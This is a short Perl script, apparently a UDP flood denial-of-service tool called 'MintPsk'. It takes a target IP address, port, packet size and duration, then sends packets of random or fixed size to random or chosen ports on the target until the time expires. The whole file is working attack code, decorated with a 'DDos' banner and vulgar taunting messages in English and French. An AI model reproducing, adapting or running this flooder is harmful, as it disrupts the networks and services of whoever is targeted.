use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# MintPsk 
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
use Term::ANSIColor;
print color 'cyan';
print BOLD CYAN<<EOTEXT;


             
               |--------------------|\n";
               |        DDos        |\n";
               |--------------------|\n";
                      
   
EOTEXT

print "MPsk : CHEH $ip " . ($port ? $port : "Sucking The Clit") . " With The Move " . 
  ($size ? "$size-Slammed" : "45000") . "Bots" . 
  ($time ? " for $time seconds" : "") . "\n";
print "STOP L'ATTACK A CETTE PUTE CTRL+C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}